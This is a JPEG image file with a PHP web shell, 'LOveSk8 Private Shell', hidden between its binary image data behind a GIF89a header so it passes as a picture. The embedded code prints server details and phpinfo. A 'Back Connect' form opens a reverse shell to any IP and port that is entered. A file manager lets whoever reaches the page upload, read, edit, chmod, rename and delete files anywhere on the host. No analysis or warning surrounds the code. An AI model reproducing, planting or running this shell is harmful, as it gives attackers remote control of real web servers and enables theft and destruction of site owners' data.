ÿØÿà JFIF      ÿí 6Photoshop 3.0 8BIM     g YT_yJ7mYN2KCoi_NcNQZ ÿâICC_PROFILE   lcms  mntrRGB XYZ Ü    ) 9acspAPPL                          öÖ     Ó-lcms                                               
desc   ü   ^cprt  \   wtpt  h   bkpt  |   rXYZ     gXYZ  ¤   bXYZ  ¸   rTRC  Ì   @gTRC  Ì   @bTRC  Ì   @desc       c2                                                                                  text    FB  XYZ       öÖ     Ó-XYZ         3  ¤XYZ       o¢  8õ  XYZ       b™  ·…  ÚXYZ       $   „  ¶Ïcurv          ËÉc’kö?Q4!ñ)2;’FQw]íkpz‰±š|¬i¿}ÓÃé0ÿÿÿÛ C 		

	

"##!  %*5-%'2(  .?/279<<<$-BFA:F5;<9ÿÛ C


9& &99999999999999999999999999999999999999999999999999ÿþ;
GIF89a;
<center>
<H1><center>LOveSk8 Shell</center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<?php
$freespace_show = sprintf('%1.2f', $bytes / pow($base, $class)) . ' ' . $si_prefix[$class] . '';
$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:#444444\">ON </span></b>" : "<b><span style=\"color:red\"/>Disabled </span></b>";
echo '<b><font color=red>Disable Functions: </b></font>';
    if ('' == ($func = @ini_get('disable_functions'))) {
        echo "<b><font color=green>NONE</font></b>";
    } else {
        echo "<b><font color=red>$func</font></b>";
    echo '</td></tr>';
    }
echo '</br>';
echo '<b><font color=red>Uname : </b></font><b>'.php_uname().'</b>';
echo '</br>';
echo '<b><font color=red>PHP Version : </b></font><b>'. phpversion() .'</b>';
echo '</br>';
echo '<b><font color=red>Server Admin : </b></font><b>'.$_SERVER['SERVER_ADMIN'].'</b>';
echo '</br>';
echo '<b><font color=red>Server IP  :   </b></font><b>'.$_SERVER['SERVER_ADDR'].' </b>';
echo '<b><font color=red>Your IP :  </b></font><b>'.$_SERVER['REMOTE_ADDR'].'</b>';
echo "</br>";
echo "<b><font color=red>Safe Mode :  </font></b>";
// Check for safe mode
if( ini_get('safe_mode') ) {
  print '<font color=#FF0000><b>Safe Mode is ON</b></font>';
} else {
  print '<font color=#008000><b>Safe Mode is OFF</b></font>';
}
echo "</br>";
echo "<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>";
echo "<b><font color=red>Functions : </font><b>";echo "<a href='$php_self?p=info'>PHP INFO </a>";
if(@$_GET['p']=="info"){@phpinfo();
exit;}
?>
<br>
</center>
<center>
<b><font color=red>Back Connect </font></b>
<form action="?connect=Pub" method="post">
  IP : <input type="text" name="ip" value= "Your IP"/>
  PORt :<input type="text" name="port" value= "22"/>
 <input alt="Submit" type="image">
</form>
<?php
function printit ($string)
 {
   if (!$daemon) 
{
      print "$string\
";
   }
}
$bc = $_GET["connect"];
switch($bc)
{
case "Pub":
set_time_limit (0);
$VERSION = "1.0";
$ip = $_POST["ip"];
$port = $_POST["port"];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) 
{

   $pid = pcntl_fork();

   if ($pid == -1) 
{
      printit("ERROR: Can't fork");
      exit(1);
   }

   if ($pid) {
      exit(0);  // Parent exits
   }
   if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
   }

   $daemon = 1;
} 
else {
   print("DISCONNECTED");
}

// Change to a safe directory
chdir("/tmp/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
   printit("$errstr ($errno)");
   exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
   printit("ERROR: Can't spawn shell");
   exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("");

while (1) {
   // Check for end of TCP connection
   if (feof($sock)) {
      printit(" :- TCP connection ended");
      break;
   }

   // Check for end of STDOUT
   if (feof($pipes[1])) {
      printit("END of STDOUT");
      break;
   }

   // Wait until a command is end down $sock, or some
   // command output is available on STDOUT or STDERR
   $read_a = array($sock, $pipes[1], $pipes[2]);
   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

   // If we can read from the TCP socket, send
   // data to process's STDIN
   if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
   }

   // If we can read from the process's STDOUT
   // send data down tcp connection
   if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
   }

   // If we can read from the process's STDERR
   // send data down tcp connection
   if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
   }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
break;
}


  ?>
</center>
</td></tr>';
<?php

set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>LOveSk8 Private Shell</title>
<style>
body{
    font-family: "Arial", cursive;
    background-color: #e6e6e6;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: gray;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px #000000 dotted;
}
H1{
    font-family: "Arial", cursive;
}
a{
    color: #000;
    text-decoration: none;
}
a:hover{
    color: #fff;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<font color=red><b>Current Path : </font></b>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<center>';
echo '<form enctype="multipart/form-data" method="POST">
<b><font color=red>File Upload : </b></font><input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<br />LOveSk8 Private Shell<font color="red">2.0</font>
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>ÿÂ  È È " ÿÄ              ÿÄ             ÿÄ             ÿÚ     ø`;ÉÇt½gu¬V¨kGš³g[“Yƒ\€   ë—æ»-*ó^¼ñ®`ÝL»sUyvˆ    vzý—S.÷‰ºc\ÀÔ†–^Ã=±}éÆÌrT‘c¯~…À\€ ÖÉžtƒšy¬qkBÌ{×)EèòeèØo>Åì¬ô±V£Xp¼À y4±zÒMØæt&…wî2.ió=¡—2f»Zå‚´ž|ilãë—^|  zÔÊÐ)Ü’Œk+Y›’oIÒ>y§™¿q¿Jiæ¹Œ‹5±-ÊÏ*Ý¥TÒ¼³eÌzóp z9×1éõ%hËõÙ¯4§©d>ôeJØ¦xõ>Bò·;¯7w°w'L½g&ñ¢–-qà¹NÝØïÌ_ À®ßÍíçô4èE5nÎJËõbÒ–ö¦AÃºäÓ‹G=¼Wå$‡†¹ ­|y&÷ríI:bób62Ú=¬ßzå­cÜs¦L3Ã®<šbzž«ç®ÏÏèS¹ª5Ä  õz‚knJ³ßß®rjµîCyÚŠo3¤4ç«s,•©\øñÆ¸‚   ú¹DRÒìÖŒ2U-G‹ãÿ ‹ŒÑ¿8    vH´&ôaõë=•t¨³z*vš÷æ\å¯c;bóÃzó®     žº625'kx¸½yk–hmÜ-ù¬>ã¼ÂÀ ÿÄ )         ! "#0123@AC4ÿÚ   ôí“Ó½3¥$Ï14ÆÖÜà'Q6?à*“ƒM¶uc<¥ÞƒÆnQµJ?Àžœl’I>¨{à~í0Z5Ñ§§Nš™ð¶Nf×@ëôÏæ‰ìp)8ºj6tr‰ÃéÓSƒ^]7õ¢3˜ééÍ0¤$N¤ŒjÑ±#GÍIRüðôm‰¥£gJÆÖcÕß78‘£.‹YË)¨£ýrr¨A¶$]ñ4ªƒ¯cê¨ÙùÅ“]6$úmf.)2Ù¶i›9éå”Ö1Æfr$ÇN1Q‹!­%r|½riIgn7Ÿô¢3gAg†óL¥©L
NbK:aq¹ˆê;0ã¨ÉÅ™ºqÏ`Ç~¢|_@Ê;É;œZd’•s]IöäÍÆC:S¨²–œÎÌ¤šQ\v•`ìå6­«Mž¡@>¥¢4úâ`Ñ›4½†s‹âöüÿ §îÛ{”N¤²Îº0“¥ËiYëy1kÙ5	Å€ÎŠá†L?„v§*ß¦ƒö$ˆ,åKšé™ƒÒ;qˆiõ:Š%^ÎþíïÝ7ÚŸ¿¢?ùÿ çOÄ­¾Ïq%X³Ž¾¯˜Ù9p~YÏqNù¨;×À`m³™ÀìÔ§íèÓÿ ÞMÜ°Ç Ä€å|• Îª¢5ûK~(çvñÒ1ä‰ÎÕ Uôé\+ËãfR¸ßœlê¾O¢*ÄOÆQKôŠÔÓ÷õMº©ÕWËEú@'K!¾QË·„—›ûZZQÈ~£©X©Ý-œžXV/ž\g—åÆtâ¹/vy]ñ‡˜G“!ðˆ3ž ‰¬¨:²Þ®éÊâÎ|#¹â©!"ôé¾£P¡sß»Æt,µSñW<¸žÛ·?f™½ÜwÉógnúZEvk†N0ín[y€Ø)”¡söé¼u96Â‡w‹Ÿl”åìoçº”^-÷ªí°xê?žš˜¿.œ{¡#¾Tw™å_vûnßöùgTiygÄf–mÂƒŽXŒƒq¥×âû´€ÊëÓºS¤‚	„ÁužN½‹£I#òãq÷Mø0B¹=-AÙ7ðl]AÚ¯ÌÈý›óêÿÄ %          !1A02Q"qaÿÚ ?³¹3K„?RLùÇùìE[ëe¢™5OZtÉ®Ö”³F1\²×H’§¦¦5N´(HÂ(s}iI¾Räœ”¸oƒÃÛ8ø™^ôFJD×zcÅÉ*t’6_ª)U’ñ3Þ¨o©!Öÿ B˜hÉrY+ŒÖxãß"Q[¢rjÇ&ù éG„OŸÊ{¦zªˆÍ£$!“&öüAW"Ú7¢énaôÏlIöI;Ü‚ìËnÖ˜É¢*?\›UPª7‘%°ë¡º½xÚþVZrGûö ·2X²-¾‡»ìŽëØNŒž›Ù96ˆpKÿÄ              01!AqÿÚ ?§S®ƒ ÏQÐÉËŽ-8yOÛ;X{Ð£C(¢¡G&œqÐ‡j{®øÝ|¡Àb÷Ëö
PçÿÄ 9       !1A"Qaq #02BRb¡±3@r’C‘ÁcsƒðÿÚ   ?íX-º£ºØ§?¹Yøm‘’MFïÝú9¨àÁÅl3ÞåÛpìbnhTo•ß Äí–ï*(¯ˆ©žÛÙ»hxäÄÀ˜Rï–EpÓÆºêbÞ¡»ÂêýLË—c+-ª¬p>
ü§5	XËƒHB£c”=Òá£WtÐÏ©[N%Y©­‘[n;Yaæ¶Ý%CiÒ¸+4ÆõÞUš»¶_yWqðÁUg”çÀôlµMW®í²Vp8tnZý–*o`<n»Íž#%Šdoñ‹HØ9¨ŒN
0«™+rÕÊ	€F“X•ªÈ©qÂ8¢X9·z‘å9xV½v®îŸ»–Ó½º.U€hW¹ãd÷b

ÊpÔJpÔß½`ÆéÊJï;˜JLªüõ íèé?O	˜
	†ƒ¼ ?0ñÉ8ú[²!\m¨˜>§nS€w@avð®!Ìû ª3GmsVœÀ0º®nJ¤$mŒÖKd^	6AÃ'	í†?MTRhoUÊ{õh”ßîQ¨Lë.tBgÍ´T.eK}Â²ê,4Þ¶ü©Ê]ê¾øÎäN{É+j4ÁÑa¯NOÌ ÑNž¨“DtFÑ16Y=zãÚ­ûQ<Ù8÷ÊÂs§e~e]ð]ÜÔÿ QÙpDÏ79xùU9 m£¢e[Y§ÎðˆW='þª¡?G³[’w²²ì.«Ó'YiÍ# Ñ”ÿ t@Ë/dpÙŒÈ*ohÄçû ¶ªÑöºZd*`jéG±N£G§	Y4{&IÝ¤{5‡ÊÉå³Òá;G%S«¡På¹©ÓçwÑr+ $µCDt†›$öphë'Ócå¬ÍË=ÎþÕò6+«wþ
8Ç˜özÇÙ¡|Õö1¼áj&NAÄ ÒÝèöãúËŠ§ŽÖ —l:®z5u°F©= #7¥KMåjŽsÔÿ •~Ü…3†§Ým‹p³ÂWæ5~c?’üÖ%z³ÉøjRus´OÅS½˜àS[‹¼h‚Ò®:qúÍš…&éŸ¯>Ê{Éß‰Z}ü.»Navï¢Ãp£«¦\Üösâƒ°2²g SÍ6€ÖäºÚ;l4óQ£¬óa	•KË1P‹Q©Ö|®ÍC»§ý*¤ý×Zë|
Ü§ÅÂr(Ó7suC.ªb·Ñw#i‚ãâTö]²éwÖÇÙoÇ³û‚qõ°árŠ­Ä±5¤Ÿ›E$øØŽM¹]vcÝdoÆiÂ †äª¿-•$N‰ÔôMäŸ{7ËÀéª óD~¬j¦=”˜á	¨|m»UV\8hQŽi‡_*ÿ ¯ü§·Qpƒ¾!? vêMuTï„Ù¨Ö™X™´7„Ú†Ç’ÄÚu:“*î®ó'‘>Qr‚„ÇŽ' ‹E7>³Ý<ÔªÑxêÚ™N*D–ã/z8«DèÅÇ2uPÒcA¨O—èjTÎ}¼yPÐÉQ“(öÀìa~Ðé§óS#ÀÿÄ )       !1AQaq 0‘¡ÁÑáð±ñ@ÿÚ   ?!ðÙgšû½Ôÿ O_bHx•Í­¶µ†¡ÿ Â®:rÏ´Ü= öƒ;yG€2!Š©CgO<.Xàu…ð;NÄµò¾<¿_Ü‚Ÿ9KÛS”·ƒC·’F­àèÍ+(Üó„µ$¤c»Ÿ)Š´/wAƒé§“!s“‚7‚]ËÅ6>N^É1L•¼žE¨!<”7÷ñ‹ÅÅ]Ô¾f4n~ä'ÕšË\¸=â®]6òLLƒŸU7<"Zæ³G1^úSø•ÆËøš¸8Úb¯fÒÜï@‚ïÞ/¼©DŽ»5ü§kHðx_@ûDçBS!Ðj&{æŸ3I2÷Vl´å„ëo„CìXAVã«úÃÂÞÏ0‚\BF­´Ð†%…ß¬ÁîËSu#ÚS–#K·¢÷ÃSbì©3k}8ê‘ 
U{c“¬#Ê6¼¥i‰Z×²W?Þ ”‰ÃPXU¿Ò g¸¸‹.â‘ôµ
^'›cù"rm˜­ä1æ+DzÒqïšóÙ#)|z }½]s3Ýª÷”ÃÞ#Ò
ïÑ{#ŠŒ&€"*Ðv&¦S=‡X¢€3yŸí}£lãu`:™B¤çbOSKþbç¦Ž ¨uÓ©[½¥ìÅ•ˆîX˜n4‹ElMŒmÒ´ x·–#JÁ©1•Íë´bHÔ‹‚QüÛÊZÁû'›/©ýS<šešS½éÂ<ÍVv¨µƒx~…ô;JûœÂRùòš[1.›c(»žäRŸ®¨}c÷`Œ¤'ÚÈ…Š)M`¦¼<Šý£S°#“Dá|F¶6…¿mWV¯âuýŸ¨ •µ9:Í!·Š˜bùv‰–.‰Ü¬N³^¼äQî(ªš¶ý5KbáþÌ°`k¿ª|ÏôõšLÛ­Óâ±„kÇH¨k–p‚7ßBí²VÕÖiˆ¹p7Š˜zH>¢gÇk@¨Œ»Ü€ZgRï×ëª=AÉÉÆŽH,UªöŽÛ¯‡(.pe³^‘è°—º§B®{<÷…24hÙ
ëEš¥
Ök	œ¿’2Áð7æò"TÚ.e·.°çÃAÓ@v
î´eø?ìÕú&‰‚¾Iª/€‡î>“·Çíç´¸–ðŠ•B24}zG}ÏÓ:ô¸‚CQÜ<ËK‡3O”E‡-
XÔìÛæ:K_«‚jÄÃƒFÈ^¯ "B°ý¡ñšJf/}¡IÄÙé6ºq’;~»Q-}¤ßiì†qô‡0-‡ÂS8š¯8?p†¦›\Jb‘Y2×Ö(W©ÃPêúî'Uo(âZld†Í
¶LÒ·ªD
Ï*a´5.è=q4 h¼ÊâŠt!‰}J¯´×m
1±6bñùS·«w²cš‚¸ÜÆeæó¼i¬M¨G%¡Ìå…t°ù¥t~bp§IZ‹ÆïYhuUöýÍn¡Ã7­àÄÑÜõ‰ð¬„êWÎk@ÖÛVt½a ¯ ÚàtÏN%W2t÷Ž	ŸÌf£“ëÚ[‰º>áüKw©2³›>y „aþIÒ`ýR#†¥ùëYlnV§â{*„µÔKûJ®î¯ÒòdA…ÐóÔDÑ³†PÜCæQœX\Ã‘CA5ëôfM‹Ez2ã%¢Ï€†vL«™zÙÃ(êã¶§žÅÈe¥%^Í£ëÕ0qh–:óFl#Éc£úcYhVÅw—8šÇ"£
ï-HùÉZb>ëJ¸«9sIÞ~kºýXÄ3¬šJ†îŠ¾~†nÝ{N`¯ÿÚ     ò‚ÏÅÿ <óÏ<ò#ìóÁGóÏ<óÂ¾óÏ$3<½óÏ<‘|/?€Ø÷Ï<º½¿››}Sß<ðÊ‡­«´º:Ç_<‰ÐíÓÎá¼ñ5ßCßâ–ýóÄll
Ž)ÔåóÏ<N­â»ÿ lóÏ<ó—mö¼óÏ<óÂ4Ž×Ï<óÏ&’ÐMÞÿ <óÿÄ &         !1 AQaq‘¡±0ÑÁáÿÚ ?ˆ¨†Æ§õÐú\KÁÏéø1Ì¡M}ð®¥¹Æ÷PÔýðµ<Ï©Ôž!®AÂyÔÇ¹À‚ÂQ½¾Ò•`E¾j9ßêQÚ
Õrç ¨r|Å| .*µ*®©O´g9·´!]rù-nn
Â‚¶bSgç>"
,ô Zƒ7â4#ÂãEâS^¿û 3÷ÿ aeA¹¨Ù+)8\'-÷ˆÑèMÊ$—9I·Ö®OQæ!—¬Š¦»A¬ÅcA=æ}/ß²!›‹~ ^†8¡³¬KÃÞÙØÌCBŽGW¼Í	{m²¹¹’ÃÍï…\j'x|,Œ˜é—$·6ëýç(¥aäê¶ŽÄEo˜µKýËIbLT¬ÄÏ÷ð\nP«wÐ¸1v¯Ô¡«^3L$ÊÞq})ãE‰ð€:A
“ Ÿy7ðÿÄ            !1 A0QaqÿÚ ?—S-K;`I·¡h™eà,ŠÎiqV+igRžØ¬â; Ù~j –`;âµ,èˆn(Lµ7X¸•®Zê*Ì¹e·pq*ábîL.ÈµÄé™•(¿’û"®.® jdÊ{šyM‘Üm,ø4xVb%µÀ^HoîJÅtEøˆ¬EÔ«O1cû3Jƒ˜_p.ç·ì	T‰¿IQ-HÑÜÑ¨áô%ÀÃÈÚáÿÄ (      !1AQaq‘¡ 0±ÁÑáð@ÿÚ   ?úM °˜¾µˆTHkúL|Ìq¨õÿ ƒÜ¦^Ø˜y2û–à„D´má³ÔDŸü –¯ÖÄHé©‰è¾“šeò‘¨!/ìkæ4‡¸Æ‡üu /ÐÜ´OŸ}1#rª?ëÐ‡œýŽ¯¨­ß-…b®¯Ò4ÅHW±vh†Xýë†— Lô•B£àm2¹¿°ðŒˆÎ“]M|KœrM¼ò‘q»UðÓ>ÀÓ*âóÉawEõ81…:ô!XÖ¸Ï,¯TßÛ™‰„Ô~Î‹¢ý	ê2¦0·m×“G·Ö´Ç
Ù¤aƒAGôª¸iFmjKzÅ¨
\lüÀOT=Ñ(K6tõ4Eª¿,mú7C?eZá¥eäÏþÄJwÿ jA`,W èük €n9;?röŒÐãÃèÖ›=KËT*%¢ïPÖ5È¤z¿©‡‘¨YåÌ°XÏæKP/­ý¥`(cP1ìêWgSÉ*§W¯c ˆ«@+»¯ˆVR
=m–\64§¬¶µ¨j«(œŽÄ¬pËWò0Ò-‘¨ˆÊD©Eü?
-Ù¼ÃìÔî©­ŒrÃÐ›Úœø€²MfÃ­±O$*ñàØuò¿\C×s:?J Ñ‹Ì±ZÖÉÓó*WÞRô1ÏˆO¼±’2ƒ7ÃãxÔTýˆ¨&ãö…(x t  ;4óÜä¾ÃöÊPº`|–bm\c\ÃÝIîcH_þE‡Üe ú5©Kp9¬v„éƒ%Â:m:ÅÌ
 ÝUn©ŒË€#\Qî!Z^®¹2ëR–¾Ð_1Ê§ý ¥†XˆçêÈLÉT›A»#©7•Lm\­ yu|C‚õa“škå–=
 åÌÉ'¼ íg=ãU5­¡;ŒÛ¤d¾ÃÝ‚¯6Ã Ô®‚h@R Ì&zdŠËª–ž4V ^2ÝgMb˜@A-ZÐØî$ 80k)6‡ Mšzïà-I¢HÙä^y¢tÔZY§Ô5iQ?eCÎ=CŽD©|—ú:Û*ÙÛ•ÅT+‘Üh—V«ä‹ZYÚtòaTßäãªª²š_ð1âo°€}>OîZ4o¬] ù,ó¢Úª9zÅõ2~%¡« :=>X=î‚mšøƒÛªÐXòþ	cÂCB(oí³3®÷Ì¡š¶+äµ—l"ŽQ: UÁi7+ÕêÖÍãe|_ì1
à5¤uŽËo¤Ýve})ˆFÚ×ðJL¶âBÕ°²W´#`:¯[™Uå!­jŸ wXÆ•4œì>‹1­t+>ÂÂ$	zþÜ{ŽÊªv^ïHœºÖ)–^Úé(Mx‰lx°”ø#(;cv(€¶¿Ó À5¬ù×bÛlÑïÉ‰¾Hå•ªâEWÓŠò„Ømý@]’ŠSKÆzE2
åð9rÕ–˜(€lÅÂR­Ã ¶ñxÞ#KÛAÕ\Ç|àVÂÓð^ì­áöï—•Õ” FulPák‘óÅïž°h±£éBi1†ÔP~YÕçþà&9Z4[‹6Ã†bl1ù¹‚ò€­Ràæˆ&h§é[‚¶»#úŽÆFÙ¦þX6¬ªù\ÆŠaÅæ3kYeíeJ È‹£‰xn®\æ#Ù	-”Ýk¨¶žñH¥Iu‹”©¨]¯˜b•¬sB€q˜óuêu­_÷}b
ã)!2 PPÝ¶¾`8,(&ÚhD¥úu è”Åw1cvhNØ†ÞA\þ˜w?Ä-#Ð;¦EXú–ÀVfèi]^Ã•‚GÓÇª]·þ±(«®ìA‘@î¶¾`ê²C@^ŽF¼Kù¢¾¤¸˜¶{¦÷ó€5 Ä¤¸‘È2'x(þ˜uõŠ¬£Ž_bx:ÆÀ¢^É¿ö$t]°Ì¸¶S\ÿ ®Ñ¾+f°@à#9r
àA`Õ>¶ 
‰
©ªòú›=a%ñHõ
±(z¹ZþHõ¿í{Ö)ƒßú@°|¿é2È7kùP]ª~aelbZT»Z^ÕXág=µ‰“PhŒŠ–ù{š”>¤Õýx‡WQ¹îS“
dºÖ´Ò0Xú±zI1à˜‘sSYj7ðÌM:W%T«éS{*ï{„õH«€i!p] ¦Qøšª^µd5yÖàoÊP¡†¹¼¥R
eÎ`ÁÎñáÝVô½tÙŽƒ
